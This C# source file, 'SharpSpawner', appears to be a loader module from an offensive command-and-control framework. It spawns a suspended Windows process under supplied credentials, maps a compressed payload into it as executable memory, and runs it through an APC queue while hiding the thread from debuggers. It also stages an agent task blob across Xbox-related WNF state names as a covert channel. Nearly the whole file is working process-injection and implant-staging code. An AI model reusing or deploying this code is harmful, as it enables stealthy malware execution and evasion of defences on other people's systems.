using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Net;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Web.Script.Serialization;

class SharpSpawner
{
    static private string nutclr = "#NUTCLR#";
    static private string task = "#TASK#";

    public SharpSpawner()
    {
        Execute(new string[] { " " });
    }

    static void Execute(string [] args)
    {
        var startInfo = new Natives.STARTUPINFO();

        Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
        Natives.LARGE_INTEGER largeinteger = new Natives.LARGE_INTEGER();
        Natives.SYSTEM_INFO info = new Natives.SYSTEM_INFO();

        startInfo.cb = (uint)Marshal.SizeOf(startInfo);

        Natives.SECURITY_ATTRIBUTES pSec = new Natives.SECURITY_ATTRIBUTES();
        Natives.SECURITY_ATTRIBUTES tSec = new Natives.SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        tSec.nLength = Marshal.SizeOf(tSec);

        IntPtr section = IntPtr.Zero;
        uint size = 0;

        IntPtr baseAddr = IntPtr.Zero;
        IntPtr viewSize = (IntPtr)size;
        IntPtr soffset = IntPtr.Zero;

        IntPtr baseAddrEx = IntPtr.Zero;
        IntPtr viewSizeEx = (IntPtr)size;

        IntPtr hToken = IntPtr.Zero;

        IntPtr hProcTest = IntPtr.Zero;
        IntPtr hTokenTest = IntPtr.Zero;

        uint flags = Natives.CreateSuspended | Natives.CreateNoWindow;

    try
    {
        if (Natives.CreateProcessWithLogonW("#USERNAME#", "#DOMAIN#", "#PASSWORD#", Natives.LogonFlags.NetCredentialsOnly, @"C:\Windows\System32\#SPAWN#", "", flags, (UInt32)0, "C:\\Windows\\System32", ref startInfo, out procInfo))
        {

                byte[] payload = DecompressDLL(Convert.FromBase64String(nutclr));

                //Round payload size to page size
                Natives.GetSystemInfo(ref info);
                size = info.dwPageSize - (uint)payload.Length % info.dwPageSize + (uint)payload.Length;
                largeinteger.LowPart = size;

                //Crteate section in current process
                var status = Natives.ZwCreateSection(ref section, Natives.GenericAll, IntPtr.Zero, ref largeinteger, Natives.PAGE_EXECUTE_READWRITE, Natives.SecCommit, IntPtr.Zero);

                //Map section to current process
                status = Natives.ZwMapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, IntPtr.Zero, IntPtr.Zero, soffset, ref viewSize, 1, 0, Natives.PAGE_EXECUTE_READWRITE);

                if (baseAddr != IntPtr.Zero)
                {
                    //Copy payload to current process section
                    Marshal.Copy(payload, 0, baseAddr, payload.Length);

                    //Map remote section
                    status = Natives.ZwMapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref viewSizeEx, 1, 0, Natives.PAGE_EXECUTE_READWRITE);

                    if (baseAddrEx != IntPtr.Zero && viewSizeEx != IntPtr.Zero)
                    {
                        //Unmap current process section
                        Natives.ZwUnmapViewOfSection(Natives.GetCurrentProcess(), baseAddr);

                        // Assign address of shellcode to the target thread apc queue
                        IntPtr th = procInfo.hThread;
                        IntPtr ptrq = Natives.ZwQueueApcThread(th, baseAddrEx, IntPtr.Zero);
                        Natives.ZwSetInformationThread(th, 1, IntPtr.Zero, 0);

                        //Before resuming the thread we write the stager on wnf 
                        //so it can be read from the spawned process from other session

                        WriteWnF(task);

                        int rest = Natives.ZwResumeThread(th, out ulong outsupn);

                    }
                    else
                    {
                        Console.WriteLine("[x] Error mapping remote section");
                        File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping remote section");
                    }
                }
                else
                {
                    Console.WriteLine("[x] Error mapping section to current process");
                    File.WriteAllText(@"c:\temp\log.txt", "[x] Error mapping section to current process");
                }

                Natives.CloseHandle(procInfo.hThread);
                Natives.CloseHandle(procInfo.hProcess);
                Natives.CloseHandle(hProcTest);
                Natives.CloseHandle(hTokenTest);
            }
            else
            {
                Console.WriteLine("[x] Error creating process");
                File.WriteAllText(@"c:\temp\log.txt", "[x] Error creating process " + Natives.GetLastError());
                
            }
            Natives.CloseHandle(hProcTest);
        Natives.CloseHandle(hTokenTest);
    
    }
    catch (Exception e)
    {
        Console.WriteLine("[x] Generic error");
        File.WriteAllText(@"c:\temp\log.txt", "[x] Generic error " + e.Message + " " + e.StackTrace);
    }
}

    private static bool RemoveData()
    {
        if (QueryWnf(Natives.WNF_XBOX_STORAGE_CHANGED).Data.Length > 0)
        {
            var s1 = UpdateWnf(Natives.PART_1, new byte[] { });
            var s2 = UpdateWnf(Natives.PART_2, new byte[] { });
            var s3 = UpdateWnf(Natives.PART_3, new byte[] { });
            var s4 = UpdateWnf(Natives.PART_4, new byte[] { });

            UpdateWnf(Natives.WNF_XBOX_STORAGE_CHANGED, new byte[0] { });
        }

        return true;
    }

    public static void WriteWnF(string agentB64){
        var stager = new byte[0];

        RemoveData();

        if (QueryWnf(Natives.WNF_XBOX_STORAGE_CHANGED).Data.Length <= 0)
        {

            var s1 = UpdateWnf(Natives.PART_1, new byte[] { });
            var s2 = UpdateWnf(Natives.PART_2, new byte[] { });
            var s3 = UpdateWnf(Natives.PART_3, new byte[] { });
            var s4 = UpdateWnf(Natives.PART_4, new byte[] { });


            stager = Encoding.Default.GetBytes(agentB64);

            var chunksize = stager.Length / 4;
            var part1 = new MemoryStream();
            var part2 = new MemoryStream();
            var part3 = new MemoryStream();
            var part4 = new MemoryStream();

            part1.Write(stager, 0, chunksize);
            part2.Write(stager, chunksize, chunksize);
            part3.Write(stager, chunksize * 2 , chunksize);
            part4.Write(stager, chunksize * 3, stager.Length - (chunksize * 3));

            var p1_compressed = CompressGZipAssembly(part1.ToArray());
            var p2_compressed = CompressGZipAssembly(part2.ToArray());
            var p3_compressed = CompressGZipAssembly(part3.ToArray());
            var p4_compressed = CompressGZipAssembly(part4.ToArray());

            if (
                (p1_compressed.Length > 2048) ||
                (p2_compressed.Length > 2048) ||
                (p3_compressed.Length > 2048) ||
                (p4_compressed.Length > 2048)
            )
            {
                Console.WriteLine("Error, size too large!");
                return;
            }

            s1 = UpdateWnf(Natives.PART_1, p1_compressed);
            s2 = UpdateWnf(Natives.PART_2, p2_compressed);
            s3 = UpdateWnf(Natives.PART_3, p3_compressed);
            s4 = UpdateWnf(Natives.PART_4, p4_compressed);

            UpdateWnf(Natives.WNF_XBOX_STORAGE_CHANGED, new byte[1] { 0x1 });
        }
    }

    public static int UpdateWnf(ulong state, byte[] data)
    {
        using (var buffer = data.ToBuffer())
        {
            ulong state_name = state;

            return Natives.ZwUpdateWnfStateData(ref state_name, buffer,
                buffer.Length, null, IntPtr.Zero, 0, false);
        }
    }

    public static Natives.WnfStateData QueryWnf(ulong state)
    {
        var data = new Natives.WnfStateData();
        int tries = 10;
        int size = 4096;
        while (tries-- > 0)
        {
            using (var buffer = new SafeHGlobalBuffer(size))
            {
                int status;
                status = Natives.ZwQueryWnfStateData(ref state, null, IntPtr.Zero, out int changestamp, buffer, ref size);

                if (status == 0xC0000023)
                    continue;
                data = new Natives.WnfStateData(changestamp, buffer.ReadBytes(size));
            }
        }
        return data;
    }

    public static byte[] CompressGZipAssembly(byte[] bytes)
    {
        MemoryStream mems = new MemoryStream();
        GZipStream zips = new GZipStream(mems, CompressionMode.Compress);
        zips.Write(bytes, 0, bytes.Length);
        zips.Close();
        mems.Close();

        return mems.ToArray();
    }

    public static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }
}

class Utility
{
    public class ModuleConfig
    {
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class CommandConfig
    {
        public string Command { get; set; }
        public string[] Parameters { get; set; }
    }

    public class StandardConfig
    {
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class TaskMsg
    {
        public string Agentid { get; set; }
        public string AgentPivot { get; set; }
        public string TaskType { get; set; }
        public bool Chunked { get; set; }
        public int ChunkNumber { get; set; }
        public ModuleConfig ModuleTask { get; set; }
        public CommandConfig CommandTask { get; set; }
        public StandardConfig StandardTask { get; set; }
    }

}

// Original dev: James Forshaw @tyranid: Project Zero
// Ref: https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/46b95cba8f76fae9a5c8258d13057d5edfacdf90/NtApiDotNet/SafeHandles.cs
public class SafeHGlobalBuffer : SafeBuffer
{
    public SafeHGlobalBuffer(int length)
      : this(length, length) { }

    protected SafeHGlobalBuffer(int allocation_length, int total_length)
        : this(Marshal.AllocHGlobal(allocation_length), total_length, true) { }

    public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
      : base(owns_handle)
    {
        Length = length;
        Initialize((ulong)length);
        SetHandle(buffer);
    }


    public static SafeHGlobalBuffer Null { get { return new SafeHGlobalBuffer(IntPtr.Zero, 0, false); } }

    protected override bool ReleaseHandle()
    {
        if (!IsInvalid)
        {
            Marshal.FreeHGlobal(handle);
            handle = IntPtr.Zero;
        }
        return true;
    }

    public byte[] ReadBytes(ulong byte_offset, int count)
    {
        byte[] ret = new byte[count];
        ReadArray(byte_offset, ret, 0, count);
        return ret;
    }

    public byte[] ReadBytes(int count)
    {
        return ReadBytes(0, count);
    }

    public SafeHGlobalBuffer(byte[] data) : this(data.Length)
    {
        Marshal.Copy(data, 0, handle, data.Length);
    }

    public int Length
    {
        get; private set;
    }
}


static class BufferUtils
{
    public static SafeHGlobalBuffer ToBuffer(this byte[] value)
    {
        return new SafeHGlobalBuffer(value);
    }
}

class Natives
{
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint CreateSuspended = 0x00000004;
    public const uint CreateNoWindow = 0x08000000;
    public const uint SecCommit = 0x08000000;
    public const uint GenericAll = 0x10000000;
    public const ulong PART_1 = 0x19890C35A3BEF075;
    public const ulong PART_2 = 0x19890C35A3BC6075;
    public const ulong PART_3 = 0x19890C35A3BEC075;
    public const ulong PART_4 = 0x19890C35A3BEF875; //A3BEF875 - 19890C35 WNF_XBOX_SETTINGS_RAW_NOTIFICATION_RECEIVED
    public const ulong WNF_XBOX_STORAGE_CHANGED = 0x19890C35A3BD6875;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO
    {
        public uint dwOem;
        public uint dwPageSize;
        public IntPtr lpMinAppAddress;
        public IntPtr lpMaxAppAddress;
        public IntPtr dwActiveProcMask;
        public uint dwNumProcs;
        public uint dwProcType;
        public uint dwAllocGranularity;
        public ushort wProcLevel;
        public ushort wProcRevision;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct LARGE_INTEGER
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public string lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttributes;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdErr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class WnfType
    {
        public Guid TypeId;
    }
    
    public enum LogonFlags
    {
        WithProfile = 1,
        NetCredentialsOnly
    }

    public class WnfStateData
    {
        public int Changestamp { get; }
        public byte[] Data { get; }

        public WnfStateData() { }
        public WnfStateData(int changestamp, byte[] data)
        {
            Changestamp = changestamp;
            Data = data;
        }
    }

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int ZwQueryWnfStateData(ref ulong StateId, [In, Optional] WnfType TypeId, [Optional] IntPtr Scope, out int Changestamp, SafeBuffer DataBuffer, ref int DataBufferSize
    );


    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int ZwUpdateWnfStateData(ref ulong StateId, SafeBuffer DataBuffer, int DataBufferSize, [In, Optional] WnfType TypeId, [Optional] IntPtr Scope, int MatchingChangestamp, [MarshalAs(UnmanagedType.Bool)] bool CheckChangestamp
    );

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            LogonFlags dwLogonFlags,
            String applicationName,
            String commandLine,
            uint dwCreationFlags,
            UInt32 environment,
            String currentDirectory,
            ref STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);
    
    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern int ZwResumeThread(IntPtr hThread, out ulong PreviousSuspendCount);

    [DllImport("kernel32", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    public static extern uint GetLastError();

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    public static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    public static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    public static extern IntPtr ZwQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr dwData);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    public static extern IntPtr ZwSetInformationThread(IntPtr hThread, uint ThreadInformationClass, IntPtr ThreadInformation, ulong ThreadInformationLength);

    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    public static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

}

